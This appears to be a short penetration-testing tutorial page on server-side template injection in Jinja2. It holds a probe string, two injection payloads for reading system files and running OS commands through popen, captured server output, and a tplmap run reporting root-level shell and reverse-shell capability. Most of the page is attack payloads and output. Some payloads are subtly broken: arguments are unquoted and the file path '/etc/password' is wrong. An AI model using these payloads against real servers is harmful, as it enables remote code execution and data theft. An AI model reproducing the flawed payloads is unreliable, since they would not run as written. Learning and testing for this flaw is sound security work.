---
sidebar_position: 1
---

# Server Side Template Injection

`SSTI` Occurs when a User is able to pass in a parameter that can control the **Template Engine** that is running on the Server.


- **Vulnerable Code:** Different template engines have different injection PAYLOADS. **In this case we can Test the Vulnerability with `{{2+2}}`**


```html
<!DOCTYPE html><html><body>    
	<form action="/" method="post">      
		First name:<br>      
	<input type="text" name="name" value="">      
	<input type="submit" value="Submit">    
	</form><p></p></body></html>
	
return render_template_string(template)
```

<br/>

## Manual Exploitation

:::info This Section Applies to Jinja2

:::

<br/>


- **The PAYLOAD load's the File Object in Python.**


```py
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/etc/password).read()}}
```

- The PAYLOAD Import's the OS Module, and **Run's a Command using the Popen Method.**

```py
{{config.__class__.__init__.__globals__['os'].popen(hostnamectl).read()}}
```

```html
HTTP/1.0 200 OK
Server: Werkzeug/1.0.1 Python/2.7.17

<!DOCTYPE html><html><body>    
<form action="/" method="post">      
	First name:<br>      
<input type="text" name="name" value="">      
<input type="submit" value="Submit">    
</form><p>   
   Static hostname: netlink
         Icon name: computer-vm
           Chassis: vm
        Machine ID: f589fe33e4b649fd9cbc222f5a19d5a4
           Boot ID: a9bc374573784f718f0d39deee65f014
    Virtualization: xen
  Operating System: Ubuntu 18.04.4 LTS
            Kernel: Linux 4.15.0-76-generic
      Architecture: x86-64
</p></body></html>
``` 

<br/>

## Automatic Exploitation `TPLMAP`

`TPLMAP` assists the exploitation of Code Injection and Server-Side Template Injection Vulnerabilities with a number of Sandbox Escape Techniques to get access to the Underlying OS.



```bash
[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
...
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

GET parameter: name
Engine: Jinja2
Injection: {{*}}
Context: text
OS: linux
Technique: render
Capabilities:

Shell command execution: ok
Bind and reverse shell: ok
File write: ok
File read: ok
Code evaluation: ok, python code

uid=0(root) gid=0(root) groups=0(root)
```